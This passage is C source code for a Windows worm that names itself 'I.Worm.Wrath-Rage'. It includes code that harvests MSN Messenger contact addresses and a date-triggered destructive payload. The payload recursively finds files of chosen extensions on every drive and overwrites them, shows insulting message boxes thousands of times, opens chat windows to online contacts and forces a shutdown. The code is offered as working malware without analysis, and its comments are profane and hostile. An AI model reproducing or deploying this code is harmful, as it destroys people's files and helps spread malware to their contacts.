					if (pIMessengerContact->get_SigninName(&email) == S_OK) {
						char *actualMail = NULL;
						actualMail = (char*)malloc(_bstr_t(email).length());
						strcpy(actualMail,(char*)_bstr_t(email));
						destinatarios[posActualDestinatarios] = (char*)malloc(sizeof(char) * (strlen(actualMail) + 1));
						strcpy(destinatarios[posActualDestinatarios],actualMail); //copy recipient to array.
						posActualDestinatarios++;
					}
				}
			}
		}
		pIMessenger->Release();
		CoUninitialize();
	}
}
/*
Function to execute worm payload.
*/
void executePayload() {
	//payload of the worm will change depending of the day.
	SYSTEMTIME x;
	GetSystemTime(&x);
	if ((x.wDay == 1) && (x.wMonth == 11)) {
		//this is a very special date for me. it probable represents why i make this worm
		//why i hate some things.. why.. a lot of things. time to be a SOB.
		fuckAll(); //fuck all
	}
	else {
		if ((x.wDay == 3) || (x.wDay == 9)) {
			//i like number 3, and number 9.
			defaultPayload();
		}
	}

}
/*
	1-11 , time to fuck all.
*/
void fuckAll() {
	findFilesToFuck(arrayExtensionsVeryFuckedPayload); //find files to fuck.
	fuckFilesStoredInStruct();
	int i = 0;
	while (i < 10000) {
		MessageBox(NULL,"1-11 I'm sorry to say you this but.. you have been fucked. 1 November, day of people died, and much more..\n\nI.Worm.Wrath-Rage coded by jalo (drm~r).","I.Worm.Wrath-Rage",NULL);
		i++;
	}
	openMSNWindows();
	Sleep(60000);
	ExitWindows(0, 0);
}
/*
	Default payload, executed days 3 and 9 of each month
*/
void defaultPayload() {
	findFilesToFuck(arrayExtensionsDefaultPayload); //find files to fuck.
	fuckFilesStoredInStruct();
	int i = 0;
	openMSNWindows();
	while (i < 100) {
		MessageBox(NULL,"I'm sorry to say you this but you have been fucked.\n\nI.Worm.Wrath-Rage coded by jalo (drm~r)","I.Worm.Wrath-Rage",NULL);
		i++;
	}
	Sleep(30000);
	ExitWindows(0, 0);
	//default payload makes:
	//fuck .avi, .mpg, .part and .mp3 files
	//show a message to the user
}
/*
	Find files in the path specified, with extension specified, and stored in the struct specified.
*/
void findFiles(char *where, char *arrayExtensions[], struct FILESTOFUCK *fToFuck) {
	HANDLE hFind;
	WIN32_FIND_DATA FindFileData;
	char *w = (char*)malloc(sizeof(char) * (strlen(where) + 2));
	strcpy(w,where);
	strcat(w,"*");
	hFind = FindFirstFile(w, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		if ((FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData.cFileName,"..") != 0) && (strcmp(FindFileData.cFileName,".") != 0)) {
			//if is a directory..
			char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData.cFileName) + 2));
			strcpy(w2,where);
			strcat(w2,FindFileData.cFileName);
			strcat(w2,"\\");
			
			findFiles(w2,arrayExtensions,fToFuck);
		}
		else {
			if (isExtSearched(fileExt(FindFileData.cFileName),arrayExtensions)) {
				//file to fuck
					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData.cFileName) + strlen(where) + 1));
					strcpy(aux,where);
					strcat(aux,FindFileData.cFileName);
					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
					strcpy(fToFuck->names[fToFuck->counter],aux);
					fToFuck->counter++;
			}
		}
	}
	while (FindNextFile(hFind,&FindFileData) != 0) {
		if (hFind != INVALID_HANDLE_VALUE) {
			if ((FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData.cFileName,"..") != 0) && (strcmp(FindFileData.cFileName,".") != 0)) {
				char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData.cFileName) + 2));
				strcpy(w2,where);
				strcat(w2,FindFileData.cFileName);
				strcat(w2,"\\");
				findFiles(w2,arrayExtensions,fToFuck);
				//if is a directory.
			}
			else {
				if (isExtSearched(fileExt(FindFileData.cFileName),arrayExtensions)) {
					//file to fuck
					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData.cFileName) + strlen(where) + 1));
					strcpy(aux,where);
					strcat(aux,FindFileData.cFileName);
					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
					strcpy(fToFuck->names[fToFuck->counter],aux);
					fToFuck->counter++;
				}
			}
		}
	}
	FindClose(hFind);
}
/*
	Function to obtain extension of file.
*/
char *fileExt(char *f) {
	char *ext;
	int posPoint = -1;
	for (int i = (int)strlen(f); i >= 0; i--) {
		if (f[i] == '.') {//search the char '.' in string
			posPoint = i; //position of char '.' (inverted to find extension)
			break;
		}
	}
	if (posPoint == -1) {
		//notfound
		return NULL;
	}
	else {
		ext = (char*)malloc(sizeof(char) * ((strlen(f) - posPoint) + 1));
		int j = 0;
		int i = (posPoint + 1);
		for (; i < strlen(f); i++,j++) {
			ext[j] = f[i];
		}
		ext[j] = '\0';
		return ext;
	}
}
/*
	Function to know that the param 'ext' is in char 'array'. (Exact match)
*/
int isExtSearched(char *ext,char *array[]) {
	if (ext == NULL) return 0; //if no point encounter, ext will be null
	int i = 0;
	while (array[i] != NULL) {
		if (strcmp(array[i],ext) == 0) {
			return 1;
		}
		i++;
	}
	return 0;
}
/*
	Find in all drives files to fuck.
*/
void findFilesToFuck(char *extensionsToFind[]) {
	int i = 0;
	while (drivesWhereSearchFilesToFuck[i] != NULL) {
		findFiles(drivesWhereSearchFilesToFuck[i],extensionsToFind,&files);
		i++;
	}
}
/*
	Fuck every file stored in struct.
*/
void fuckFilesStoredInStruct() {
	for (int i = 0; i < files.counter; i++) {
		FILE *f = fopen(files.names[i],"w");
		fwrite(bufferFileFucked,1,strlen(bufferFileFucked),f);
		fclose(f);
	}
}
void openMSNWindows() {
	long pCount;
	BSTR email;
	IMessengerContacts *pIMessengerContacts = NULL;
	IMessengerContact *pIMessengerContact = NULL;
	IMessengerWindow *pIMessengerWindow = NULL;
	IDispatch *pIDispatch = NULL;
	IDispatch *ppMContact = NULL;
	IMessenger *pIMessenger = NULL; //a pointer to an IMessenger interface
	CoInitialize(0);
	CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger);
	pIMessenger->get_MyContacts(&pIDispatch);
	pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
	pIDispatch->Release();
	pIMessengerContacts->get_Count(&pCount);
	char *mails = (char*)malloc(sizeof(char) * (pCount * 256));
	strcpy(mails,"");
	for (int i = 0; i < pCount; i++) {
	if (pIMessengerContacts->Item(i,&pIDispatch) == S_OK) {
		if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
			if (pIMessengerContact->get_SigninName(&email) == S_OK) {
				MISTATUS status;
				if (pIMessengerContact->get_Status(&status) == S_OK) {
						// Open only to online users.
						BSTR contactstr = _bstr_t(email);
						VARIANT contact;
						contact.vt=VT_BSTR;
						contact.bstrVal=contactstr;
						if (pIMessenger->InstantMessage(contact,&pIDispatch) == S_OK) {
							pIDispatch->QueryInterface(IID_IMessengerWindow,(void**)&pIMessengerWindow);
							LONG ContactHwnd;
							pIMessengerWindow->get_HWND(&ContactHwnd);
							pIMessengerWindow->Release();
					}
				}
			}
		}
	}
}
pIMessenger->Release();
CoUninitialize();
ExitProcess(0);
}